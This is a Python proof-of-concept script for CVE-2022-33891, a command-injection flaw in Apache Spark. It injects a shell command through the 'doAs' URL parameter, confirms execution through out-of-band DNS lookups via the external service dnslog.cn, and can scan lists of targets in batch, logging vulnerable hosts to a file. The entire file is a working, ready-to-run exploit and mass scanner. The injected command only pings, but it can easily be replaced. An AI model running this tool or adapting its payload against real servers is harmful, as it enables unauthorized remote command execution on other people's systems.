import requests
import time
import os
os.system('')
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse
class apache_spark_cve_2022_33891_poc():
    def banner(self):
        print(r"""
              ______     _______     ____   ___ ____  ____      __________  ___  ___  _ 
         / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ /___ / ( _ )/ _ \/ |
        | |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \ |_ \ / _ \ (_) | |
        | |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) | (_) \__, | |
         \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/____/ \___/  /_/|_|
            by:W01fh4cker
            """)
    def poc(self, target_url, domain, session):
        url = f'{target_url}/?doAs=`ping {domain}`'
        try:
            res = session.get(url=url,verify=False, timeout=20)
            return res.status_code
        except Exception as e:
            print("\033[31m[x] Request error: \033[0m" + str(e))
    def dnslog_getdomain(self, session):
        url = 'http://www.dnslog.cn/getdomain.php?t=0'
        try:
            res = session.get(url, verify=False, timeout=20)
            return res.text
        except Exception as e:
            print("\033[31m[x] Request error: \033[0m" + str(e))
    def dnslog_getrecords(self, session, target_url, domain, count):
        url = 'http://www.dnslog.cn/getrecords.php?t=0'
        try:
            res = session.get(url, verify=False, timeout=20)
        except Exception as e:
            print("\033[31m[x] Request error: \033[0m" + str(e))
        if domain in res.text:
            if count == 0:
                print(f'[+] Get {domain} infomation,target {target_url} is vulnerable!')
                with open("CVE-2022-33891 vulnerable urls.txt", 'a+') as f:
                    f.write(target_url + "\n")
            else:
                print(f'[{str(count)}] Get {domain} infomation,target {target_url}  is vulnerable!')
                with open("CVE-2022-33891 vulnerable urls.txt", 'a+') as f:
                    f.write(target_url + "\n")
        else:
            print("\033[31m[x] Unvulnerable: \033[0m" + str(target_url))

    def main(self, target_url, dnslog_url, file):
        session = requests.session()
        count = 0
        self.banner()
        if target_url and dnslog_url:
            print('[+] Requesting dnslog--------')
            status_code = self.poc(target_url, dnslog_url, session)
            if status_code == 200:
                print(f'[+] The response value is {status_code}, please check the dnslog information by yourself.')
        elif target_url:
            session = requests.session()
            domain = self.dnslog_getdomain(session)
            self.poc(target_url, domain, session)
            self.dnslog_getrecords(session, target_url, domain, count)
        elif file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')
                session = requests.session()
                domain = self.dnslog_getdomain(session)
                time.sleep(1)
                self.poc(target_url, domain, session)
                self.dnslog_getrecords(session, target_url, domain, count)
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=False,
                        help="target url, you need to add http://")
    parser.add_argument("-d",
                        '--dnslog',
                        type=str,
                        default=False,
                        help="dnslog address, without http://")
    parser.add_argument("-f",
                        '--file',
                        type=argparse.FileType('r'),
                        default=False,
                        help="batch detection, you need to add http://")
    args = parser.parse_args()
    run = apache_spark_cve_2022_33891_poc()
    run.main(args.url, args.dnslog, args.file)
